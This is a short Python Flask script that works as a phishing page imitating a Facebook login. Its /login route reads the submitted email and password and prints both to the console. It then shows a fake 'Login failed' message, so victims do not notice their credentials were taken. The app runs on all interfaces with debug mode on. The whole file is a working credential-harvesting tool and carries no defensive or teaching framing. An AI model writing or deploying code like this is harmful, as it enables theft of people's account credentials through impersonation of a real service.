from flask import Flask, request, render_template

app = Flask(__name__)

@app.route('/', methods=['GET'])
def index():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('email')
    password = request.form.get('pass')
    
    print("===== Facebook Clone Login =====")
    print(f"👤 Username: {username}")
    print(f"🔐 Password: {password}")
    
    return "<h3>Login failed. Please try again.</h3>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)